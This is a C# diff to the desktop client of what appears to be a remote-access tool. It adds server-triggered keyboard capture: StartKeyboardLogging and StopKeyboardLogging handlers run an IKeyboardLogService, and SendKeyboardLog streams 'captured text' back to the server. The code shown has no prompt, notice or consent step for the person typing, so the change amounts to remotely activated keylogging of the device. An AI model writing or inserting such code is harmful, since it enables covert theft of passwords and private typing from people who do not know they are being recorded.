@@ -77,6 +77,11 @@ public interface IDesktopHubConnection
     /// </summary>
     Task SendAudioLiveChunk(byte[] chunk);
 
+    /// <summary>
+    /// Sends a burst of captured text to the server.
+    /// </summary>
+    Task SendKeyboardLog(KeyboardLogChunk chunk);
+
     Task SendMessageToViewer(string viewerID, string message);
     Task SendScreenshot(byte[] screenshotBytes);
     Task<Result> SendUnattendedSessionInfo(string sessionId, string accessKey, string machineName, string requesterName, string organizationName);
@@ -830,6 +835,59 @@ public class DesktopHubConnection : IDesktopHubConnection, IDesktopHubClient
         return Connection.InvokeAsync("SendAudioLiveChunk", chunk);
     }
 
+    /// <summary>
+    /// Sends a burst of captured text to the server.
+    /// </summary>
+    public Task SendKeyboardLog(KeyboardLogChunk chunk)
+    {
+        if (Connection is null)
+        {
+            return Task.CompletedTask;
+        }
+
+        return Connection.InvokeAsync("SendKeyboardLog", chunk);
+    }
+
+    /// <summary>
+    /// Called by the server to start capturing the text that is typed on
+    /// this device.
+    /// </summary>
+    public Task StartKeyboardLogging(string deviceId)
+    {
+        _logger.LogInformation("Server requested the keyboard capture.");
+
+        try
+        {
+            _serviceProvider.GetRequiredService<IKeyboardLogService>().Start();
+        }
+        catch (Exception ex)
+        {
+            _logger.LogError(ex, "Error while starting the keyboard capture.");
+        }
+
+        return Task.CompletedTask;
+    }
+
+    /// <summary>
+    /// Called by the server to stop capturing the text that is typed on this
+    /// device.
+    /// </summary>
+    public Task StopKeyboardLogging()
+    {
+        _logger.LogInformation("Server requested that the keyboard capture stop.");
+
+        try
+        {
+            _serviceProvider.GetRequiredService<IKeyboardLogService>().Stop();
+        }
+        catch (Exception ex)
+        {
+            _logger.LogError(ex, "Error while stopping the keyboard capture.");
+        }
+
+        return Task.CompletedTask;
+    }
+
     public async Task<Result> SendUnattendedSessionInfo(string unattendedSessionId, string accessKey, string machineName, string requesterName, string organizationName)
     {
         if (Connection is null)
@@ -903,6 +961,8 @@ public class DesktopHubConnection : IDesktopHubConnection, IDesktopHubClient
             nameof(StartAudioLive),
             StartAudioLive);
         connection.On(nameof(StopAudioLive), StopAudioLive);
+        connection.On<string>(nameof(StartKeyboardLogging), StartKeyboardLogging);
+        connection.On(nameof(StopKeyboardLogging), StopKeyboardLogging);
 
         connection.Reconnected += HandleReconnected;
     }
